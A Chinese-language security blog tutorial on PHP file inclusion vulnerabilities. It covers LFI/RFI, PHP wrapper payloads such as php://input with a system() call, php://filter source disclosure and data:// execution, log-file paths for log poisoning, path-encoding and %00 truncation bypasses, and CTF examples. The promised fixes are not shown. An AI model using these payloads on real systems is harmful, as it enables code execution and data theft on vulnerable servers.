<!DOCTYPE html>
<html lang="en"><head>
    <link rel="stylesheet" href="/css/custom.css">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>文件包含原理、分类、利用与修复</title>
    <meta charset="utf-8">
    <meta name="description" content="Ladder@文件包含原理、分类、利用与修复 - Hzhsec home">
    <meta name="author" content="hzhsec">
    <link rel="canonical" href="http://www.hzhsec.top/list/base_bug/%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/up3/">

    <link rel="alternate" type="application/rss+xml" href="http://www.hzhsec.top//index.xml" title="Hzhsec home">

    


<script async defer data-website-id="3bfa7bff-77f4-4fe9-ad96-a44d83f72465" src="https://umami-evtq.vercel.app/baize"></script>

    <meta property="og:title" content="文件包含原理、分类、利用与修复" />
<meta property="og:description" content="" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://www.hzhsec.top/list/base_bug/%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/up3/" /><meta property="article:section" content="list" />
<meta property="article:published_time" content="2024-05-04T10:56:54+08:00" />
<meta property="article:modified_time" content="2024-05-04T10:56:54+08:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="文件包含原理、分类、利用与修复"/>
<meta name="twitter:description" content=""/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "目录",
      "item": "http://www.hzhsec.top/list/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "基础漏洞",
      "item": "http://www.hzhsec.top/list/base_bug/"
    }, 
    {
      "@type": "ListItem",
      "position":  4 ,
      "name": "文件包含原理、分类、利用与修复",
      "item": "http://www.hzhsec.top/list/base_bug/%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/up3/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "文件包含原理、分类、利用与修复",
  "name": "文件包含原理、分类、利用与修复",
  "description": "",
  "keywords": [
    
  ],
  "articleBody": "文件包含-原理、分类、利用与修复 1. 文件包含原理 文件包含是程序开发中的一种常见技术，通常用于复用代码。开发人员会将可复用的函数或代码模块写入一个单独的文件，其他文件可以直接调用该文件，而不必重复编写。\n常见的 PHP 文件包含函数： include()：遇到错误时生成警告，程序继续执行。 require()：遇到错误时生成致命错误，脚本停止执行。 include_once()：如果文件已包含，则不再进行包含。 require_once()：如果文件已包含，则不再进行包含。 fopen(), file_get_contents()：文件读取函数。 2. 文件包含分类 文件包含漏洞可以分为两类：\n本地文件包含（LFI） 该漏洞发生在攻击者能够包含本地文件时。 远程文件包含（RFI） 该漏洞发生在攻击者能够通过 URL 包含远程文件时。 差异原因： 代码过滤：本地文件包含和远程文件包含的区别往往取决于应用的代码过滤机制。 环境配置：服务器的配置，如 allow_url_include 设置，决定了是否允许远程文件包含。 3. 白盒审计 - CTFSHOW 白盒发现 通过应用功能追踪代码，定位文件包含漏洞。 通过脚本搜索特定的文件包含函数，定位潜在的漏洞点。 使用伪协议玩法绕过修复措施。 PHP 伪协议 PHP 自带多种协议，用于访问特殊资源，例如：\nphp://input：用于读取请求体中的内容。 php://filter：通过过滤器访问文件内容。 data://：通过数据流访问文件。 zip://：访问压缩包中的文件。 phar://：通过 PHAR 压缩包协议读取文件。 参考：PHP伪协议技术\n4. 黑盒分析 黑盒发现 观察 URL 中的参数（如 path、file、dir）是否涉及文件包含。 通过分析 URL 中的路径传递参数，判断是否可能导致文件包含漏洞。 利用思路 本地利用 配合文件上传进行利用。 在日志文件中进行包含。 利用会话（SESSION）数据进行包含。 使用伪协议进行绕过。 远程利用 利用远程 URL 直接包含恶意文件。 5. PHP 伪协议 php://input（allow_url_include=On） 使用 php://input 伪协议可以绕过一些过滤，获取请求体内容。 // 构造请求 ?file=php://input // POST 数据中输入恶意代码 \u003c?php system('dir'); ?\u003e php://filter 可以将文件内容进行过滤，如使用 base64 编码。 // 使用 base64 编码绕过 ?file=php://filter/read=convert.base64-encode/resource=index.php data:// 支持将代码进行编码，通过 data 协议访问。 ?file=data://text/plain,\u003c?php phpinfo()?\u003e zip:// 访问压缩包中的文件。 ?file=zip://D:/file.zip%23flag.txt phar:// 类似 zip://，可以访问 .phar 压缩包中的文件。 ?file=phar://D:/file.zip/flag.txt 6. 包含日志文件 攻击者可以利用日志文件中的信息执行恶意代码。以下是常见的日志文件路径：\nApache + Linux： /var/log/apache2/access.log /var/log/apache2/error.log /var/log/httpd/access_log /etc/httpd/logs/access_log Nginx： /var/log/nginx/access.log /usr/local/nginx/logs/access.log IIS： C:\\Windows\\system32\\Logfiles %SystemDrive%\\inetpub\\logs\\LogFiles 7. 包含系统文件 在某些配置下，攻击者可以包含系统文件。例如：\n包含 proc/self/environ 可以获取 User-Agent 中的信息，并执行恶意代码。 \u003c?php include(\"php://input\"); 8. 文件写入 通过 php://filter 可以进行文件写入操作。\nphp://filter/write=convert.base64-encode/resource=phpinfo.php 9. 绕过技巧 过滤 read 或 resource 通过绕过过滤器访问文件资源。 ?f=php://filter/convert.base64-encode/resource=login.php 过滤 ../ 使用 URL 编码来绕过路径过滤： %2e%2e%2f // 对应 ../ %252e%252e%252f // 二次编码 %00 截断 利用 %00 截断字符进行文件包含。 ?p=../hanguo/test.php%00 10. CTF 实战 黑盒利用 - VULWEB 利用漏洞网页进行文件包含攻击：\nhttp://testphp.vulnweb.com/showimage.php?file=index.php 白盒利用 - CTFSHOW CTF 实战中，常见的伪协议绕过方法：\n?file=php://filter/read=convert.base64-encode/resource=flag.php ?file=php://input post:\u003c?php system('tac flag.php');?\u003e 11. 其他伪协议与漏洞 在 CTF 比赛中，经常会用到伪协议、路径遍历等技巧：\nphp://filter/write 用于写入文件。 data:// 用于绕过字符过滤。 参考文献：Session 漏洞分析\n参考文献：CTF 解题思路\n",
  "wordCount" : "196",
  "inLanguage": "en",
  "datePublished": "2024-05-04T10:56:54+08:00",
  "dateModified": "2024-05-04T10:56:54+08:00",
  "author":{
    "@type": "Person",
    "name": "hzhsec"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://www.hzhsec.top/list/base_bug/%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/up3/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Hzhsec home",
    "logo": {
      "@type": "ImageObject",
      "url": "http://www.hzhsec.top/favicon.ico"
    }
  }
}
</script>
    <link rel="icon" href="/static/hzhsec.png" sizes="16x16">

<link rel="apple-touch-icon" href="/static/hzhsec.png">

<link rel="manifest" href="/static/hzhsec.png">
    

    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-webfont@1.7.0/style.css" />

    
    
    <link rel="stylesheet" href="/css/main.min.ec28f09e946fc0df77c187fcd0d0ebde58fca6de8efb8e1620f3d45c32d4da88.css" integrity="sha256-7CjwnpRvwN93wYf80NDr3lj8pt6O&#43;44WIPPUXDLU2og=" crossorigin="anonymous" media="screen" />

    
    <link rel="stylesheet" href="/scss/highlight/github-dark.min.min.66034289ee9a113219a2c4aae0a8bd2095ab255c832a42efcf5863f10814e7a1.css" />

    
    <script src="/js/highlight.min.min.c098d85b5396dec4707ea2cead1445b4dc2ff0fc56b8dbbd9049d0d1c50ad237.js"></script>
    <script>hljs.highlightAll();</script>

    <script>(()=>{var t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e=localStorage.getItem("theme");t&&e===null&&(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")),t&&e==="dark"&&document.documentElement.setAttribute("data-dark-mode",""),e==="dark"&&document.documentElement.setAttribute("data-dark-mode","")})()</script>
    </head>
<body>
      <main class="wrapper"><nav class="navigation">
    <section class="container">
        <a class="navigation-brand" href="/">
            主页
        </a>
        <input type="checkbox" id="menu-toggle" />
        <label class="menu-button float-right" for="menu-toggle">
            <span></span><span></span><span></span>
        </label>
        
        <ul class="navigation-list" id="navigation-list">
            
            
            <li class="navigation-item navigation-menu">
                <a class="navigation-link" href="/list/">目录</a>
            </li>
            
            <li class="navigation-item navigation-menu">
                <a class="navigation-link" href="/archives/">归档</a>
            </li>
            
            <li class="navigation-item navigation-menu">
                <a class="navigation-link" href="/message/">关于</a>
            </li>
            
            <li class="navigation-item navigation-menu">
                <a class="navigation-link" href="/categories/">分类</a>
            </li>
            
            <li class="navigation-item navigation-menu">
                <a class="navigation-link" href="https://umami-evtq.vercel.app/share/NdRAzdY1AwLB5KF2/hzhsec.github.io">网站统计</a>
            </li>
            
            

            <li class="navigation-item menu-separator">
                <span>|</span>
            </li>

            
            
            <li class="navigation-item navigation-social">
                <a class="navigation-link" href="https://github.com/hzhsec">    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
         stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github">
      <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
    </svg>
    </a>
            </li>
            
            <li class="navigation-item navigation-social">
                <a class="navigation-link" href="/message/">    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
         stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-mail">
      <path d="M4 4h16v16H4z"></path><polyline points="4,4 12,12 20,4"></polyline>
    </svg>
    </a>
            </li>
            
            

            <li class="navigation-item navigation-dark">
                <button id="mode" type="button" aria-label="toggle user light or dark theme">
                    <span class="toggle-dark">
                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
                             stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-moon">
                            <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                        </svg>
                    </span>
                    <span class="toggle-light">
                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
                             stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-sun">
                            <circle cx="12" cy="12" r="5"></circle>
                            <line x1="12" y1="1" x2="12" y2="3"></line>
                            <line x1="12" y1="21" x2="12" y2="23"></line>
                            <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                            <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                            <line x1="1" y1="12" x2="3" y2="12"></line>
                            <line x1="21" y1="12" x2="23" y2="12"></line>
                            <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                            <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                        </svg>
                    </span>
                </button>
            </li>
            
        </ul>
        
    </section>
</nav>

<div id="content">
<article class="blog-single">
  <header class="blog-title">
    <h1>文件包含原理、分类、利用与修复</h1>
  </header>

  <p>
  <small>
    May 4, 2024&nbsp;· 196 words&nbsp;· One minute</small>

  
<p>

  <div class="blog-toc">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#文件包含-原理分类利用与修复">文件包含-原理、分类、利用与修复</a>
      <ul>
        <li><a href="#1-文件包含原理">1. 文件包含原理</a></li>
        <li><a href="#2-文件包含分类">2. 文件包含分类</a></li>
        <li><a href="#3-白盒审计---ctfshow">3. 白盒审计 - CTFSHOW</a></li>
        <li><a href="#4-黑盒分析">4. 黑盒分析</a></li>
        <li><a href="#5-php-伪协议">5. PHP 伪协议</a></li>
        <li><a href="#6-包含日志文件">6. 包含日志文件</a></li>
        <li><a href="#7-包含系统文件">7. 包含系统文件</a></li>
        <li><a href="#8-文件写入">8. 文件写入</a></li>
        <li><a href="#9-绕过技巧">9. 绕过技巧</a></li>
        <li><a href="#10-ctf-实战">10. CTF 实战</a></li>
        <li><a href="#11-其他伪协议与漏洞">11. 其他伪协议与漏洞</a></li>
      </ul>
    </li>
  </ul>
</nav>
  </div>

  <section class="blog-content"><h2 id="文件包含-原理分类利用与修复">文件包含-原理、分类、利用与修复</h2>
<h3 id="1-文件包含原理">1. 文件包含原理</h3>
<p>文件包含是程序开发中的一种常见技术，通常用于复用代码。开发人员会将可复用的函数或代码模块写入一个单独的文件，其他文件可以直接调用该文件，而不必重复编写。</p>
<h4 id="常见的-php-文件包含函数">常见的 PHP 文件包含函数：</h4>
<ul>
<li><code>include()</code>：遇到错误时生成警告，程序继续执行。</li>
<li><code>require()</code>：遇到错误时生成致命错误，脚本停止执行。</li>
<li><code>include_once()</code>：如果文件已包含，则不再进行包含。</li>
<li><code>require_once()</code>：如果文件已包含，则不再进行包含。</li>
<li><code>fopen()</code>, <code>file_get_contents()</code>：文件读取函数。</li>
</ul>
<h3 id="2-文件包含分类">2. 文件包含分类</h3>
<p>文件包含漏洞可以分为两类：</p>
<h4 id="本地文件包含lfi">本地文件包含（LFI）</h4>
<ul>
<li>该漏洞发生在攻击者能够包含本地文件时。</li>
</ul>
<h4 id="远程文件包含rfi">远程文件包含（RFI）</h4>
<ul>
<li>该漏洞发生在攻击者能够通过 URL 包含远程文件时。</li>
</ul>
<h4 id="差异原因">差异原因：</h4>
<ul>
<li><strong>代码过滤</strong>：本地文件包含和远程文件包含的区别往往取决于应用的代码过滤机制。</li>
<li><strong>环境配置</strong>：服务器的配置，如 <code>allow_url_include</code> 设置，决定了是否允许远程文件包含。</li>
</ul>
<img src="/static/image2 1.jpg">
<h3 id="3-白盒审计---ctfshow">3. 白盒审计 - CTFSHOW</h3>
<h4 id="白盒发现">白盒发现</h4>
<ul>
<li>通过应用功能追踪代码，定位文件包含漏洞。</li>
<li>通过脚本搜索特定的文件包含函数，定位潜在的漏洞点。</li>
<li>使用伪协议玩法绕过修复措施。</li>
</ul>
<h4 id="php-伪协议">PHP 伪协议</h4>
<p>PHP 自带多种协议，用于访问特殊资源，例如：</p>
<ul>
<li><code>php://input</code>：用于读取请求体中的内容。</li>
<li><code>php://filter</code>：通过过滤器访问文件内容。</li>
<li><code>data://</code>：通过数据流访问文件。</li>
<li><code>zip://</code>：访问压缩包中的文件。</li>
<li><code>phar://</code>：通过 PHAR 压缩包协议读取文件。</li>
</ul>
<p>参考：<a href="https://blog.csdn.net/unexpectedthing/article/details/121276653">PHP伪协议技术</a></p>
<h3 id="4-黑盒分析">4. 黑盒分析</h3>
<h4 id="黑盒发现">黑盒发现</h4>
<ul>
<li>观察 URL 中的参数（如 <code>path</code>、<code>file</code>、<code>dir</code>）是否涉及文件包含。</li>
<li>通过分析 URL 中的路径传递参数，判断是否可能导致文件包含漏洞。</li>
</ul>
<h4 id="利用思路">利用思路</h4>
<h5 id="本地利用">本地利用</h5>
<ol>
<li>配合文件上传进行利用。</li>
<li>在日志文件中进行包含。</li>
<li>利用会话（SESSION）数据进行包含。</li>
<li>使用伪协议进行绕过。</li>
</ol>
<h5 id="远程利用">远程利用</h5>
<ul>
<li>利用远程 URL 直接包含恶意文件。</li>
</ul>
<h3 id="5-php-伪协议">5. PHP 伪协议</h3>
<h4 id="phpinputallow_url_includeon"><code>php://input</code>（<code>allow_url_include=On</code>）</h4>
<ul>
<li>使用 <code>php://input</code> 伪协议可以绕过一些过滤，获取请求体内容。</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e">// 构造请求
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">?</span><span style="color:#a6e22e">file</span><span style="color:#f92672">=</span><span style="color:#a6e22e">php</span><span style="color:#f92672">://</span><span style="color:#a6e22e">input</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// POST 数据中输入恶意代码
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#39;dir&#39;</span>); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><h4 id="phpfilter"><code>php://filter</code></h4>
<ul>
<li>可以将文件内容进行过滤，如使用 <code>base64</code> 编码。</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>// 使用 base64 编码绕过
</span></span><span style="display:flex;"><span>?file=php://filter/read=convert.base64-encode/resource=index.php
</span></span></code></pre></div><h4 id="data"><code>data://</code></h4>
<ul>
<li>支持将代码进行编码，通过 <code>data</code> 协议访问。</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>?file=data://text/plain,&lt;?php phpinfo()?&gt;
</span></span></code></pre></div><h4 id="zip"><code>zip://</code></h4>
<ul>
<li>访问压缩包中的文件。</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>?file=zip://D:/file.zip%23flag.txt
</span></span></code></pre></div><h4 id="phar"><code>phar://</code></h4>
<ul>
<li>类似 <code>zip://</code>，可以访问 <code>.phar</code> 压缩包中的文件。</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>?file=phar://D:/file.zip/flag.txt
</span></span></code></pre></div><h3 id="6-包含日志文件">6. 包含日志文件</h3>
<p>攻击者可以利用日志文件中的信息执行恶意代码。以下是常见的日志文件路径：</p>
<ul>
<li><strong>Apache + Linux</strong>：
<ul>
<li><code>/var/log/apache2/access.log</code></li>
<li><code>/var/log/apache2/error.log</code></li>
<li><code>/var/log/httpd/access_log</code></li>
<li><code>/etc/httpd/logs/access_log</code></li>
</ul>
</li>
<li><strong>Nginx</strong>：
<ul>
<li><code>/var/log/nginx/access.log</code></li>
<li><code>/usr/local/nginx/logs/access.log</code></li>
</ul>
</li>
<li><strong>IIS</strong>：
<ul>
<li><code>C:\Windows\system32\Logfiles</code></li>
<li><code>%SystemDrive%\inetpub\logs\LogFiles</code></li>
</ul>
</li>
</ul>
<h3 id="7-包含系统文件">7. 包含系统文件</h3>
<p>在某些配置下，攻击者可以包含系统文件。例如：</p>
<ul>
<li>包含 <code>proc/self/environ</code> 可以获取 <code>User-Agent</code> 中的信息，并执行恶意代码。</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&lt;?php
</span></span><span style="display:flex;"><span>include(&#34;php://input&#34;);
</span></span></code></pre></div><h3 id="8-文件写入">8. 文件写入</h3>
<p>通过 <code>php://filter</code> 可以进行文件写入操作。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>php://filter/write=convert.base64-encode/resource=phpinfo.php
</span></span></code></pre></div><h3 id="9-绕过技巧">9. 绕过技巧</h3>
<h4 id="过滤-read-或-resource">过滤 <code>read</code> 或 <code>resource</code></h4>
<ul>
<li>通过绕过过滤器访问文件资源。</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>?f=php://filter/convert.base64-encode/resource=login.php
</span></span></code></pre></div><h4 id="过滤-">过滤 <code>../</code></h4>
<ul>
<li>使用 URL 编码来绕过路径过滤：</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>%2e%2e%2f   // 对应 ../
</span></span><span style="display:flex;"><span>%252e%252e%252f   // 二次编码
</span></span></code></pre></div><h4 id="00-截断"><code>%00</code> 截断</h4>
<ul>
<li>利用 <code>%00</code> 截断字符进行文件包含。</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>?p=../hanguo/test.php%00
</span></span></code></pre></div><h3 id="10-ctf-实战">10. CTF 实战</h3>
<h4 id="黑盒利用---vulweb">黑盒利用 - VULWEB</h4>
<p>利用漏洞网页进行文件包含攻击：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>http://testphp.vulnweb.com/showimage.php?file=index.php
</span></span></code></pre></div><h4 id="白盒利用---ctfshow">白盒利用 - CTFSHOW</h4>
<p>CTF 实战中，常见的伪协议绕过方法：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>?file=php://filter/read=convert.base64-encode/resource=flag.php
</span></span><span style="display:flex;"><span>?file=php://input post:&lt;?php system(&#39;tac flag.php&#39;);?&gt;
</span></span></code></pre></div><h3 id="11-其他伪协议与漏洞">11. 其他伪协议与漏洞</h3>
<p>在 CTF 比赛中，经常会用到伪协议、路径遍历等技巧：</p>
<ul>
<li><code>php://filter/write</code> 用于写入文件。</li>
<li><code>data://</code> 用于绕过字符过滤。</li>
</ul>
<blockquote>
<p>参考文献：<a href="https://www.cnblogs.com/lnterpreter/p/14086164.html">Session 漏洞分析</a></p>
</blockquote>
<blockquote>
<p>参考文献：<a href="https://www.cnblogs.com/echoDetected/p/13976405.html">CTF 解题思路</a></p>
</blockquote>
<hr></section>

  
  
  <div class="paginator">
    
    <a class="prev" href="http://www.hzhsec.top/list/app/app3/">
      <svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375C21.4339 3.93962 21.3581 3.30535 21.1917 2.76787M3.77086 21.1546C1.9934 20.7777 0.973585 18.7264 1.08749 16.688C1.2668 13.479 1.15721 9.43135 1.00513 6.21507C0.87809 3.52811 3.12891 1.16316 5.51029 1.25008C9.76594 1.40542 15.377 1.20229 18.7912 1.00542C20.0864 0.930734 20.8406 1.63385 21.1917 2.76787M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787C23.1097 4.18217 23.13 12.4191 22.9004 16.3608C20.8478 24.0194 12.3061 23.6662 6.5 22.0658M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608C21.2797 23.0494 11.3665 22.9511 6.5 22.0658M9.94496 9C9.28897 9.61644 7.63215 10.997 6.04814 11.7966C5.98257 11.8297 5.98456 11.9753 6.05061 12.0063C7.05496 12.4779 8.92941 13.9264 9.94496 15M6.44444 11.9667C8.86549 12.0608 14 12 16 11" stroke="currentColor" stroke-linecap="round"/>
      </svg>
      <span>APK 逆向：数据/逻辑/视图 修改实战</span></a>
    
    
    <a class="next" href="http://www.hzhsec.top/list/base_bug/sql%E6%B3%A8%E5%85%A5/sql3/"><span>MySQL：增删改查与盲注技巧</span>
      <svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375C21.4339 3.93962 21.3581 3.30535 21.1917 2.76787M3.77086 21.1546C1.9934 20.7777 0.973585 18.7264 1.08749 16.688C1.2668 13.479 1.15721 9.43135 1.00513 6.21507C0.87809 3.52811 3.12891 1.16316 5.51029 1.25008C9.76594 1.40542 15.377 1.20229 18.7912 1.00542C20.0864 0.930734 20.8406 1.63385 21.1917 2.76787M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787C23.1097 4.18217 23.13 12.4191 22.9004 16.3608C20.8478 24.0194 12.3061 23.6662 6.5 22.0658M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608C21.2797 23.0494 11.3665 22.9511 6.5 22.0658M12.055 9C12.711 9.61644 14.3679 10.997 15.9519 11.7966C16.0174 11.8297 16.0154 11.9753 15.9494 12.0063C14.945 12.4779 13.0706 13.9264 12.055 15M15.5556 11.9667C13.1345 12.0608 8 12 6 11" stroke="currentColor" stroke-linecap="round"/>
      </svg>
    </a>
    
  </div>
  

  


</article>

        </div><footer class="footer">
  <p>&copy; 2025 <a href="http://www.hzhsec.top/">Hzhsec home</a>
    Powered by
    <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a>
    <a href="https://github.com/guangzhengli/hugo-theme-ladder" rel="noopener" target="_blank">Ladder</a>
️  </p>
</footer>

<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M10.5376 22.7916C11.0152 22.7207 22.5795 21.1781 22.0978 10.4211C22.0536 9.43274 21.9303 8.53367 21.7387 7.71865M10.5376 22.7916C16.876 22.3728 20.0969 19.8899 21.5383 16.9142M10.5376 22.7916C9.7707 22.9055 8.97982 22.8964 8.19743 22.7725M21.7387 7.71865C21.4988 6.69828 21.1518 5.80967 20.7188 5.04257M21.7387 7.71865C22.6022 10.1105 23.0542 13.7848 21.5383 16.9142M20.7188 5.04257C17.1684 -1.24629 7.83127 0.632493 4.27577 5.04257C2.88063 6.77451 -0.0433281 11.1668 1.38159 16.6571C2.27481 20.0988 5.17269 22.2936 8.19743 22.7725M20.7188 5.04257C22.0697 6.9404 24.0299 11.3848 22.3541 15.4153M21.5383 16.9142C21.8737 16.4251 22.1428 15.9235 22.3541 15.4153M8.19743 22.7725C12.1971 23.4683 20.6281 22.971 22.3541 15.4153M14 10.945C13.3836 10.289 12.003 8.63215 11.2034 7.04814C11.1703 6.98257 11.0247 6.98456 10.9937 7.05061C10.5221 8.05496 9.07362 9.92941 8 10.945M11.0333 7.44444C10.9392 9.86549 11 15 12 17" stroke="currentColor" stroke-linecap="round"/>
    </svg>
</a>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };
</script>

<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'Copy';

        function copyingDone() {
            copybutton.innerHTML = 'Copied';
            setTimeout(() => {
                copybutton.innerHTML = 'Copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });
        codeblock.parentNode.appendChild(copybutton);
    });
</script></main>
    </body>
  
  <script src="/main.min.6bb26b69159420159c74dc9e097b06a578ed2b68c701466a91a44a9632d851bd0af167a1b30012387b4c512b48ad9ad4d3394e04d77ae38d57e1920fe4ed34fe.js" integrity="sha512-a7JraRWUIBWcdNyeCXsGpXjtK2jHAUZqkaRKljLYUb0K8WehswASOHtMUStIrZrU0zlOBNd6441X4ZIP5O00/g==" crossorigin="anonymous" defer></script></html>
